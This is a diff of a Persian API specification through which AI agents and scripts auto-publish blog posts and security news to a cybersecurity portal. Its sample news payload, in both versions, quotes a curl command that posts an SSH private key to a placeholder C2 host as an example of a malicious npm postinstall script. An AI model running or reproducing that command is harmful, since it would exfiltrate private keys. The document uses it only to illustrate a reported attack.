@@ -1,210 +1,143 @@
-# راهنمای اتصال هوش مصنوعی و انتشار خودکار محتوا در پرتال رهام
-## Roham AI Content Ingestion & Auto-Posting REST API Specification
+# راهنمای جامع اتصال هوش مصنوعی و انتشار محتوا در پرتال امنیت سایبری رهام
+## Roham AI Content Ingestion & Auto-Posting REST API Specification (v2.0)
 
-این مستند نحوه تعامل مستقیم اسکریپت‌ها، بات‌ها، ایجنت‌های هوش مصنوعی (مانند ChatGPT، Claude، Gemini، DeepSeek یا اسکریپت‌های پایتون و کرون‌جاب) با وب‌سایت رهام جهت انتشار خودکار **مقالات وبلاگ فنی** و **اخبار امنیت** را به طور کامل تشریح می‌کند.
-
----
-
-### ۱. معماری و اندپوینت‌های اصلی (API Endpoints)
-
-کلیه درخواست‌ها با متد `POST` به فایل PHP بک‌اند روی هاست ارسال می‌شوند:
-
-- **اندپوینت اصلی ارسال و ویرایش محتوا:**
-  `https://your-domain.com/api/content.php`
-- **فرمت ارسال داده:** `Content-Type: application/json`
-- **انکودینگ کاراکترها:** `UTF-8`
+این مستند مشخصات فنی و استانداردهای جدید انتشار خودکار محتوا (مقالات تخصصی وبلاگ و هشدارهای رادار تهدیدات امنیتی) را برای **ایجنت‌های هوش مصنوعی (ChatGPT, Claude, Gemini, DeepSeek)**، بات‌های تلگرام/گیت‌هاب، اسکریپت‌های پایتون و سیستم‌های خودکار Ingestion تشریح می‌کند.
 
 ---
 
-### ۲. احراز هویت (Authentication)
+### ۱. معماری و خلاصه تغییرات نسخه ۲.۰
 
-برای اینکه هوش مصنوعی بتواند بدون نیاز به لاگین دستی در مرورگر پست ارسال کند، از **کلید API اختصاصی** استفاده می‌شود. این کلید در فایل `public/api/config.php` هاست تحت متغیر `ROHAM_AI_POSTING_KEY` تعریف شده است.
-
-ارسال کلید به دو روش امکان‌پذیر است:
-1. **روش استاندارد (هدر HTTP):**
-   ```http
-   X-API-KEY: roham_ai_publisher_secret_key_2026_xyz
-   ```
-2. **ارسال درون بدنه JSON:**
-   ```json
-   {
-     "api_key": "roham_ai_publisher_secret_key_2026_xyz",
-     "action": "save_blog",
-     ...
-   }
-   ```
-
-*(نکته: می‌توانید مقدار `ROHAM_AI_POSTING_KEY` را در فایل `public/api/config.php` به هر رشته تصادفی و امنی که مایلید تغییر دهید).*
+در معماری بازطراحی‌شده نسخه ۲.۰:
+1. **ساختار یکپارچه و استاندارد (Unified Action):** تمام درخواست‌های وبلاگ و اخبار از طریق اکشن واحد `upsert_content` با تفکیک فیلد `type: "blog" | "news"` ارسال می‌شوند.
+2. **حذف ساختار تودرتوی قدیمی:** ساختار پیچیده قبلی (`intro`, `sections`, `conclusion`, `paragraphs`, `codeSnippet`, `callout`) به طور کامل حذف شده است. مدل هوش مصنوعی یا کلاینت **فقط متادیتا + `bodyMarkdown`** تولید می‌کند.
+3. **پردازش و رندر سمت سرور:** سرور PHP به صورت خودکار مارک‌داون را به HTML ساخت‌یافته تبدیل کرده، با فیلترهای ضد XSS ایمن‌سازی (Sanitize) می‌کند، و نسخه‌های سازگار با گذشته را در دیتابیس می‌سازد.
+4. **مدیریت فیلدهای کنترلی توسط سرور:** فیلدهای امنیتی مانند `id`، شمارنده بازدید `views`، تاریخ سرور و حل نام رسمی دسته‌بندی از `categoryId` توسط سرور مدیریت می‌شوند و کلاینت اجازه جعل آن‌ها را ندارد.
+5. **تاریخ‌های استاندارد ISO 8601:** فیلد `publishedAt` به فرمت جهانی ISO 8601 (مانند `2026-04-01T12:30:00Z`) است.
+6. **قابلیت‌های سازمانی:** پشتیبانی کامل از **Idempotency** (هدر `Idempotency-Key`)، **Audit Log** (ثبت تغییرات)، **Rate Limiting** (کنترل نرخ ارسال) و **OpenAPI 3.1 / JSON Schema**.
+7. **سازگاری موقت:** اکشن‌های قدیمی `save_blog` و `save_news` به طور کامل به سرویس جدید نگاشت می‌شوند.
 
 ---
 
-### ۳. ساختار دسته‌بندی‌ها (Categories)
+### ۲. اطلاعات اندپوینت و روش‌های احراز هویت
 
-هر پست و هر خبر **حتماً باید در یکی از دسته‌بندی‌های سایت** قرار گیرد. لیست پیش‌فرض دسته‌بندی‌ها به شرح زیر است (همچنین می‌توانید دسته‌بندی‌های جدید را از پنل ادمین اضافه یا با اندپوینت `save_category` بسازید):
+- **مسیر اصلی اندپوینت:** `https://your-domain.com/api/content.php`
+- **متد HTTP:** `POST` (یا `GET` برای لیست و اسکیما)
+- **هدرهای الزامی:**
+  ```http
+  Content-Type: application/json; charset=utf-8
+  X-API-KEY: roham_ai_publisher_secret_key_2026_xyz
+  ```
+- **هدر اختیاری عدم دوباره‌کاری (Idempotency):**
+  ```http
+  Idempotency-Key: 7b9f2c3d-8e4a-4e1b-9f2d-5c6a7b8c9d0e
+  ```
+  *(اگر به دلیل خطای شبکه درخواست مجدداً ارسال شود، سرور بدون اجرای دوباره کوئری، پاسخ کش‌شده را با هدر `X-Idempotency: HIT` بازمی‌گرداند).*
 
-| شناسه (`categoryId`) | نام دسته‌بندی (فارسی) | کاربرد |
+---
+
+### ۳. جدول دسته‌بندی‌های رسمی سایت (`categoryId`)
+
+هوش مصنوعی باید یکی از شناسه‌های استاندارد زیر را در فیلد `categoryId` قرار دهد (سرور به صورت خودکار عنوان رسمی فارسی را به محتوا متصل می‌کند):
+
+| شناسه (`categoryId`) | عنوان رسمی دسته‌بندی | کاربرد |
 |---|---|---|
+| `malware-infostealers` | بدافزارها و استیلرها | وبلاگ و اخبار |
 | `supply-chain` | حملات زنجیره تامین (Supply Chain) | وبلاگ و اخبار |
-| `social-engineering` | مهندسی اجتماعی و فیشینگ | وبلاگ و اخبار |
 | `vulnerabilities-exploits` | تحلیل آسیب‌پذیری و اکسپلویت | وبلاگ و اخبار |
 | `writeups-research` | گزارش‌های فنی و رایت‌آپ | وبلاگ و اخبار |
-| `malware-infostealers` | بدافزارها و استیلرها | وبلاگ و اخبار |
+| `social-engineering` | مهندسی اجتماعی و فیشینگ | وبلاگ و اخبار |
 | `cloud-infrastructure` | امنیت ابری و زیرساخت | وبلاگ و اخبار |
-| `security-alerts` | اخبار و هشدارهای فوری | اخبار امنیت |
+| `security-alerts` | اخبار و هشدارهای فوری | هشدارهای رادار |
 
 ---
 
-### ۴. متد ۱: انتشار مقاله وبلاگ تخصصی (`save_blog`)
+### ۴. ساختار درخواست انتشار وبلاگ تخصصی (`type: "blog"`)
 
-ساختار یک مقاله استاندارد وبلاگ دقیقاً مشابه مقالات کالبدشکافی عمیق است:
-
-#### درخواست نمونه:
-```http
-POST /api/content.php HTTP/1.1
-Host: roham.org
-Content-Type: application/json
-X-API-KEY: roham_ai_publisher_secret_key_2026_xyz
-
+```json
 {
-  "action": "save_blog",
-  "post": {
-    "id": "post-ai-1740000001",
+  "action": "upsert_content",
+  "type": "blog",
+  "content": {
     "slug": "stealer-app-bound-encryption-bypass-analysis",
-    "title": "کالبدشکافی عمیق روش‌های نوین بایپس App-Bound Encryption در استیلرهای ۲۰۲۶",
-    "subtitle": "چگونه توسعه‌دهندگان بدافزار مکانیزم جدید محافظت از کوکی‌های کرومیوم را دور می‌زنند؟",
-    "summary": "واکاوی فنی آسیب‌پذیری‌های ارتقای دسترسی محلی (LPE) و تزریق به پردازه‌های مورد اعتماد کروم جهت استخراج کوکی‌های نشست بدون نیاز به کلید DPAPI سیستمی.",
-    "category": "بدافزارها و استیلرها",
+    "title": "کالبدشکافی عمیق روش‌های نوین بایپس App-Bound Encryption",
+    "subtitle": "چگونه توسعه‌دهندگان بدافزار مکانیزم جدید کروم را دور می‌زنند؟",
+    "summary": "واکاوی فنی تزریق به پردازه‌های مورد اعتماد کروم برای استخراج کوکی‌ها.",
     "categoryId": "malware-infostealers",
-    "difficulty": "تخصصی (Deep-Dive)",
-    "readTime": "۱۱ دقیقه",
-    "date": "فروردین ۱۴۰۵",
-    "author": "واحد تحلیل بدافزار رهام (AI Assisted)",
-    "authorRole": "Roham Threat Research Labs",
+    "tags": ["AppBoundEncryption", "Chromium", "Infostealer"],
     "status": "published",
-    "isFeatured": true,
-    "views": 0,
-    "keywords": [
-      "AppBoundEncryption",
-      "Chromium",
-      "Infostealer",
-      "ProcessInjection",
-      "SessionHijacking"
-    ],
-    "tldr": [
-      "تکنیک‌های قدیمی DPAPI در نسخه‌های جدید کروم با محافظت مبتنی بر سرویس سیستم جایگزین شده‌اند.",
-      "استیلرهای نوظهور با تکنیک تزریق کد به فرآیند مرورگر مجاز کلید رمزنگاری را در حافظه به دست می‌آورند.",
-      "جداسازی پردازه‌ها و نظارت بر IPC تنها راه موثر پایش این کلاس از حملات است."
-    ],
-    "content": {
-      "intro": "در سال‌های اخیر، سرقت سشن‌ها و کوکی‌های مرورگر به سودآورترین بردار نفوذ برای مجرمان سایبری تبدیل شده است...",
-      "sections": [
-        {
-          "id": "sec-1",
-          "heading: "۱. بررسی معماری حفاظتی کروم",
-          "paragraphs": [
-            "کروم در نسخه‌های اخیر کلید رمزگذاری پایگاه‌داده کوکی‌ها را به یک سرویس سیستمی مجزا منتقل کرده است.",
-            "> توجه: دسترسی مستقیم به فایل SQLite دیگر برای خواندن داده‌های رمزشده کافی نیست."
-          ],
-          "codeSnippet": "Get-ItemProperty -Path 'HKLM:\\Software\\Google\\Chrome'",
-          "codeLanguage": "powershell",
-          "callout": "هشدار امنیتی: هرگونه فراخوانی غیرعادی APIهای ایجاد پردازه باید توسط EDR مانیتور شود.",
-          "calloutType": "warning"
-        },
-        {
-          "id": "sec-2",
-          "heading: "۲. تکنیک تزریق به حافظه پردازه",
-          "paragraphs": [
-            "بد‌افزارها با استفاده از APIهای استاندارد ویندوز تلاش می‌کنند در بستر پردازه مرورگر اجرا شوند."
-          ]
-        }
-      ],
-      "conclusion": "دفاع در برابر استیلرهای مدرن نیازمند معماری Zero-Trust و محافظت بلادرنگ از نشست‌های کاربری است.",
-      "actionableTakeaways": [
-        "فعال‌سازی سیاست محدودسازی دسترسی به دایرکتوری User Data مرورگرها",
-        "کوتاه کردن طول عمر کوکی‌های احراز هویت و استفاده از DPoP"
-      ],
-      "references": [
-        {
-          "title": "Chromium Security Architecture Whitepaper",
-          "url": "https://www.chromium.org/Home/chromium-security/"
-        }
-      ]
-    }
-  }
-}
-```
-
----
-
-### ۵. متد ۲: انتشار خبر امنیت (`save_news`)
-
-ساختار اخبار امنیت **دقیقاً مشابه ساختار مقالات وبلاگ** است، با این تفاوت که چک‌لیست عملیاتی ندارد و در انتهای آن کلیدواژه‌ها (Keywords) قرار می‌گیرند:
-
-#### درخواست نمونه:
-```http
-POST /api/content.php HTTP/1.1
-Host: roham.org
-Content-Type: application/json
-X-API-KEY: roham_ai_publisher_secret_key_2026_xyz
-
-{
-  "action": "save_news",
-  "article": {
-    "id": "news-ai-1740000002",
-    "slug": "critical-supply-chain-npm-backdoor-alert",
-    "title": "هشدار فوری: کشف پکیج مسموم با قابلیت سرقت سشن‌های SSH در مخزن NPM",
-    "subtitle": "حمله زنجیره تامین گسترده علیه توسعه‌دهندگان وب‌سایت‌های سازمانی",
-    "summary": "محققان امنیتی یک بسته مخرب را شناسایی کردند که بلافاصله پس از نصب، کلیدهای خصوصی SSH و توکن‌های ورود گیت‌هاب را به سرور C2 ارسال می‌کند.",
-    "category": "حملات زنجیره تامین (Supply Chain)",
-    "categoryId": "supply-chain",
-    "categoryLabel": "حملات زنجیره تامین (Supply Chain)",
-    "severity": "CRITICAL",
-    "status": "published",
-    "isBreaking": true,
-    "date": "امروز - ۱۲:۳۰",
-    "readTime": "۴ دقیقه",
-    "author": "مرکز عملیات امنیت رهام (SOC)",
-    "source": "BleepingComputer",
-    "sourceUrl": "https://www.bleepingcomputer.com/news/security/",
-    "views": 0,
-    "keywords": [
-      "SupplyChain",
-      "NPM",
-      "SSH_Keys",
-      "GitHub_Token",
-      "CriticalAlert"
-    ],
-    "tldr": [
-      "پکیج مخرب بیش از ۵۰ هزار بار در طول ۲۴ ساعت گذشته دانلود شده است.",
-      "کد مخرب به صورت Obfuscated در فایل install.js جاسازی شده بود.",
-      "کلیه توکن‌های گیت‌هاب ایجاد شده در ماشین قربانی باید فوراً باطل گردند."
-    ],
-    "content": {
-      "intro": "گزارش‌های جدید آزمایشگاه‌های امنیتی نشان می‌دهد یک عامل تهدید پیشرفته با انتشار بسته‌ای به ظاهر بی‌خطر در اکوسیستم NPM...",
-      "sections": [
-        {
-          "id": "sec-1",
-          "heading: "۱. جزئیات بسته مخرب و نحوه فعال‌سازی",
-          "paragraphs": [
-            "حمله از طریق اسکریپت postinstall آغاز شده و در حین فرآیند `npm install` کلیدهای خصوصی پوشه `~/.ssh` را جستجو می‌کند."
-          ],
-          "codeSnippet": "curl -s -X POST https://malicious-c2-node.net/drop -d @id_rsa",
-          "codeLanguage": "bash"
-        }
-      ],
-      "conclusion": "توصیه می‌شود مدیران DevSecOps فرآیند بررسی هش پکیج‌ها (Lockfile Integrity) را در خطوط لوله CI/CD اجباری نمایند."
+    "publishedAt": "2026-04-01T12:30:00Z",
+    "author": {
+      "name": "واحد تحلیل بدافزار رهام",
+      "role": "Roham Threat Research Labs"
     },
-    "sections": []
+    "difficulty": "deep-dive",
+    "readTimeMinutes": 11,
+    "isFeatured": true,
+    "tldr": [
+      "تکنیک‌های قدیمی DPAPI جایگزین شده‌اند.",
+      "استیلرها با تزریق کد کلید را از حافظه می‌خوانند."
+    ],
+    "takeaways": [
+      "محدودسازی دسترسی به User Data مرورگر",
+      "کوتاه کردن عمر کوکی‌ها و استفاده از DPoP"
+    ],
+    "references": [
+      {
+        "title": "Chromium Security Architecture",
+        "url": "https://www.chromium.org/Home/chromium-security/"
+      }
+    ],
+    "bodyMarkdown": "## ۱. بررسی معماری حفاظتی کروم\n\nکروم کلید رمزگذاری را به سرویس سیستمی منتقل کرده است.\n\n```powershell\nGet-ItemProperty -Path 'HKLM:\\Software\\Google\\Chrome'\n```\n\n> هشدار امنیتی: فراخوانی غیرعادی APIهای ایجاد پردازه باید مانیتور شود."
   }
 }
 ```
 
 ---
 
-### ۶. نمونه کدهای اتصال برای توسعه‌دهندگان
+### ۵. ساختار درخواست انتشار خبر امنیت (`type: "news"`)
 
-#### نمونه پایتون (Python 3):
+```json
+{
+  "action": "upsert_content",
+  "type": "news",
+  "content": {
+    "slug": "critical-supply-chain-npm-backdoor-alert",
+    "title": "هشدار فوری: کشف پکیج مسموم در NPM",
+    "subtitle": "حمله زنجیره تامین گسترده علیه توسعه‌دهندگان",
+    "summary": "بسته مخرب کلیدهای SSH و توکن‌های GitHub را به سرور C2 می‌فرستد.",
+    "categoryId": "supply-chain",
+    "tags": ["SupplyChain", "NPM", "SSH_Keys", "GitHub_Token"],
+    "severity": "critical",
+    "isBreaking": true,
+    "status": "published",
+    "publishedAt": "2026-04-01T12:30:00Z",
+    "source": {
+      "name": "BleepingComputer",
+      "url": "https://www.bleepingcomputer.com/news/security/"
+    },
+    "tldr": [
+      "پکیج مخرب بیش از ۵۰ هزار بار دانلود شده بود.",
+      "اسکریپت postinstall کلیدهای پوشه ssh را سرقت می‌کرد."
+    ],
+    "iocs": [
+      {
+        "type": "Domain/C2",
+        "value": "malicious-c2.net",
+        "description": "سرور دریافت فایل‌های سرقت‌شده"
+      }
+    ],
+    "bodyMarkdown": "## جزئیات بسته مخرب\n\nحمله از طریق اسکریپت postinstall آغاز می‌شود.\n\n```bash\ncurl -s -X POST https://malicious-c2.net/drop -d @id_rsa\n```"
+  }
+}
+```
+
+---
+
+### ۶. نمونه کدهای اجرایی برای توسعه‌دهندگان و بات‌ها
+
+#### ۱. نمونه پایتون (Python 3):
 ```python
+import uuid
 import requests
 
 API_URL = "https://your-domain.com/api/content.php"
@@ -213,122 +146,234 @@ API_KEY = "roham_ai_publisher_secret_key_2026_xyz"
 headers = {
     "Content-Type": "application/json; charset=utf-8",
     "X-API-KEY": API_KEY,
+    "Idempotency-Key": str(uuid.uuid4()),  # جلوگیری از تکرار در صورت قطع شبکه
 }
 
-post_data = {
-    "action": "save_news",
-    "article": {
-        "id": f"news-{int(requests.utils.time.time())}",
-        "slug": "ai-generated-security-bulletin",
-        "title": "عنوان گزارش خبری تولید شده توسط هوش مصنوعی",
-        "subtitle": "زیرعنوان تحلیلی و چکیده خبر",
-        "summary": "خلاصه دوخطی خبر جهت نمایش در کارت‌های صفحه اصلی...",
-        "category": "تحلیل آسیب‌پذیری و اکسپلویت",
-        "categoryId": "vulnerabilities-exploits",
-        "severity": "HIGH",
+payload = {
+    "action": "upsert_content",
+    "type": "blog",
+    "content": {
+        "slug": "stealer-app-bound-encryption-bypass-analysis",
+        "title": "کالبدشکافی عمیق روش‌های نوین بایپس App-Bound Encryption",
+        "subtitle": "چگونه توسعه‌دهندگان بدافزار مکانیزم جدید کروم را دور می‌زنند؟",
+        "summary": "واکاوی فنی تزریق به پردازه‌های مورد اعتماد کروم برای استخراج کوکی‌ها.",
+        "categoryId": "malware-infostealers",
+        "tags": ["AppBoundEncryption", "Chromium", "Infostealer"],
         "status": "published",
-        "isBreaking": False,
-        "date": "امروز",
-        "readTime": "۵ دقیقه",
-        "author": "ربات هوشمند رصد تهدیدات رهام",
-        "source": "Roham Threat Radar",
-        "views": 0,
-        "keywords": ["ZeroDay", "Exploit", "PatchTuesday"],
-        "tldr": ["یافته اول خبر", "یافته دوم خبر"],
-        "content": {
-            "intro": "متن مقدمه خبر...",
-            "sections": [
-                {
-                    "heading": "۱. شرح فنی آسیب‌پذیری",
-                    "paragraphs": ["پاراگراف اول متن تحلیل..."],
-                }
-            ],
-            "conclusion": "توصیه نهایی جهت اعمال وصله امنیتی.",
+        "publishedAt": "2026-04-01T12:30:00Z",
+        "author": {
+            "name": "واحد تحلیل بدافزار رهام",
+            "role": "Roham Threat Research Labs",
         },
+        "difficulty": "deep-dive",
+        "readTimeMinutes": 11,
+        "isFeatured": True,
+        "tldr": [
+            "تکنیک‌های قدیمی DPAPI جایگزین شده‌اند.",
+            "استیلرها با تزریق کد کلید را از حافظه می‌خوانند.",
+        ],
+        "takeaways": [
+            "محدودسازی دسترسی به User Data مرورگر",
+            "کوتاه کردن عمر کوکی‌ها و استفاده از DPoP",
+        ],
+        "references": [
+            {
+                "title": "Chromium Security Architecture",
+                "url": "https://www.chromium.org/Home/chromium-security/",
+            }
+        ],
+        "bodyMarkdown": """## ۱. بررسی معماری حفاظتی کروم
+
+کروم کلید رمزگذاری را به سرویس سیستمی منتقل کرده است.
+
+```powershell
+Get-ItemProperty -Path 'HKLM:\\Software\\Google\\Chrome'
+```
+
+> هشدار امنیتی: فراخوانی غیرعادی APIهای ایجاد پردازه باید مانیتور شود.""",
     },
 }
 
-response = requests.post(API_URL, json=post_data, headers=headers)
-print("Response:", response.status_code, response.json())
+response = requests.post(API_URL, json=payload, headers=headers, timeout=30)
+if response.status_code == 200:
+    print("✅ با موفقیت منتشر شد:", response.json())
+elif response.status_code == 429:
+    print("⚠️ محدودیت نرخ ارسال! لطفاً صبر کنید:", response.headers.get("Retry-After"))
+else:
+    print(f"❌ خطا ({response.status_code}):", response.text)
 ```
 
-#### نمونه Node.js (JavaScript / TypeScript):
-```javascript
-import fetch from "node-fetch";
+---
+
+#### ۲. نمونه Node.js (TypeScript / JavaScript):
+```typescript
+import crypto from "crypto";
 
 const API_URL = "https://your-domain.com/api/content.php";
 const API_KEY = "roham_ai_publisher_secret_key_2026_xyz";
 
-async function publishNews(article) {
-  const res = await fetch(API_URL, {
+async function publishNews() {
+  const payload = {
+    action: "upsert_content",
+    type: "news",
+    content: {
+      slug: "critical-supply-chain-npm-backdoor-alert",
+      title: "هشدار فوری: کشف پکیج مسموم در NPM",
+      subtitle: "حمله زنجیره تامین گسترده علیه توسعه‌دهندگان",
+      summary: "بسته مخرب کلیدهای SSH و توکن‌های GitHub را به سرور C2 می‌فرستد.",
+      categoryId: "supply-chain",
+      tags: ["SupplyChain", "NPM", "SSH_Keys", "GitHub_Token"],
+      severity: "critical",
+      isBreaking: true,
+      status: "published",
+      publishedAt: new Date().toISOString(),
+      source: {
+        name: "BleepingComputer",
+        url: "https://www.bleepingcomputer.com/news/security/",
+      },
+      tldr: [
+        "پکیج مخرب در کمتر از ۲۴ ساعت بیش از ۵۰ هزار بار دانلود شد.",
+        "توکن‌های دسترسی به مخازن سازمانی به سرور C2 ارسال شده است.",
+      ],
+      bodyMarkdown: `## جزئیات بسته مخرب
+
+حمله از طریق اسکریپت postinstall آغاز می‌شود.
+
+\`\`\`bash
+curl -s -X POST https://malicious-c2.net/drop -d @id_rsa
+\`\`\``,
+    },
+  };
+
+  const response = await fetch(API_URL, {
     method: "POST",
     headers: {
-      "Content-Type": "application/json",
+      "Content-Type": "application/json; charset=utf-8",
       "X-API-KEY": API_KEY,
+      "Idempotency-Key": crypto.randomUUID(),
     },
-    body: JSON.stringify({
-      action: "save_news",
-      article,
-    }),
+    body: JSON.stringify(payload),
   });
 
-  const result = await res.json();
-  console.log("Publish result:", result);
+  const data = await response.json();
+  if (response.ok) {
+    console.log("✅ خبر منتشر شد:", data);
+  } else {
+    console.error("❌ خطا:", data);
+  }
 }
+
+publishNews();
 ```
 
-#### نمونه دستور cURL:
+---
+
+#### ۳. نمونه دستور cURL:
 ```bash
 curl -X POST "https://your-domain.com/api/content.php" \
-  -H "Content-Type: application/json" \
+  -H "Content-Type: application/json; charset=utf-8" \
   -H "X-API-KEY: roham_ai_publisher_secret_key_2026_xyz" \
+  -H "Idempotency-Key: test-idemp-key-2026-001" \
   -d '{
-    "action": "save_blog",
-    "post": {
-      "id": "post-sample-curl",
-      "title": "تست ارسال با cURL",
-      "slug": "curl-test-post",
-      "summary": "تست صحت اتصال اندپوینت PHP",
-      "category": "امنیت ابری و زیرساخت",
-      "categoryId": "cloud-infrastructure",
-      "difficulty": "متوسط",
-      "readTime": "۳ دقیقه",
-      "date": "امروز",
-      "author": "API Script",
+    "action": "upsert_content",
+    "type": "blog",
+    "content": {
+      "slug": "curl-test-upsert",
+      "title": "تست انتشار مستقیم با cURL و ساختار Markdown",
+      "summary": "تست صحت کارکرد موتور جدید انتشار بدون فیلدهای ساختاری پیچیده.",
+      "categoryId": "vulnerabilities-exploits",
+      "tags": ["cURL", "Testing", "Markdown"],
       "status": "published",
-      "keywords": ["cURL", "API"],
-      "tldr": ["پست با موفقیت ثبت شد"],
-      "content": {
-        "intro": "متن تستی...",
-        "sections": [{ "heading": "بخش ۱", "paragraphs": ["تست پاراگراف"] }],
-        "conclusion": "پایان تست"
-      }
+      "bodyMarkdown": "## ۱. تیتر اول تست\n\nاین یک متن تستی است.\n\n```python\nprint(\"Hello Roham!\")\n```"
     }
   }'
 ```
 
 ---
 
-### ۷. دریافت پاسخ سرور (Response Codes)
+### ۷. استانداردهای پاسخ سرور (Response Standards)
 
-- **موفقیت (200 OK):**
-  ```json
-  {
-    "ok": true,
-    "message": "مقاله با موفقیت ذخیره شد."
+#### پاسخ موفق (200 OK):
+```json
+{
+  "success": true,
+  "ok": true,
+  "message": "مقاله تخصصی وبلاگ با موفقیت ذخیره و منتشر شد.",
+  "data": {
+    "id": "blog-stealer-app-bound-encryption-bypass-analysis",
+    "type": "blog",
+    "slug": "stealer-app-bound-encryption-bypass-analysis",
+    "title": "کالبدشکافی عمیق روش‌های نوین بایپس App-Bound Encryption",
+    "status": "published",
+    "publishedAt": "2026-04-01T12:30:00Z",
+    "views": 0,
+    "category": {
+      "id": "malware-infostealers",
+      "name": "بدافزارها و استیلرها",
+      "slug": "malware-infostealers"
+    },
+    "url": "/blog/stealer-app-bound-encryption-bypass-analysis",
+    "stats": {
+      "bodyLength": 320,
+      "readTimeMinutes": 11,
+      "tagsCount": 3
+    }
+  },
+  "meta": {
+    "timestamp": "2026-04-01T12:30:01Z",
+    "version": "2.0.0",
+    "action": "upsert_content",
+    "idempotencyKey": "test-key-123"
   }
-  ```
-- **کلید نامعتبر (403 Forbidden):**
-  ```json
-  {
-    "ok": false,
-    "error": "دسترسی غیرمجاز: فقط مدیر ارشد یا ربات‌های مجاز با کلید API می‌توانند محتوا منتشر کنند."
+}
+```
+
+#### پاسخ خطای اعتبارسنجی (400 Bad Request):
+```json
+{
+  "success": false,
+  "ok": false,
+  "error": {
+    "code": "VALIDATION_FAILED",
+    "message": "اطلاعات ارسالی با ساختار استاندارد مطابقت ندارد.",
+    "details": [
+      {
+        "field": "bodyMarkdown",
+        "message": "متن مقاله به فرمت Markdown (فیلد bodyMarkdown) الزامی است."
+      }
+    ]
+  },
+  "meta": {
+    "timestamp": "2026-04-01T12:30:01Z",
+    "version": "2.0.0"
   }
-  ```
-- **داده ناقص (400 Bad Request):**
-  ```json
-  {
-    "ok": false,
-    "error": "اطلاعات مقاله ناقص است."
+}
+```
+
+#### پاسخ محدودیت نرخ ارسال (429 Too Many Requests):
+```json
+{
+  "success": false,
+  "ok": false,
+  "error": {
+    "code": "RATE_LIMIT_EXCEEDED",
+    "message": "تعداد درخواست‌های ارسالی بیش از سقف مجاز است. لطفاً کمی صبر کرده و مجدداً تلاش کنید.",
+    "details": {
+      "retryAfterSeconds": 45
+    }
   }
-  ```
+}
+```
+
+---
+
+### ۸. اندپوینت‌های جانبی و کمکی
+
+- **دریافت خودکار JSON Schema:**
+  `GET /api/content.php?action=schema`
+- **دریافت خودکار مشخصات OpenAPI 3.1:**
+  `GET /api/content.php?action=openapi`
+- **دریافت لاگ حسابرسی محتوا (فقط ادمین):**
+  `GET /api/content.php?action=audit_logs&limit=50`
+- **اجرای مهاجرت داده‌های قدیمی:**
+  `POST /api/content.php?action=migrate`
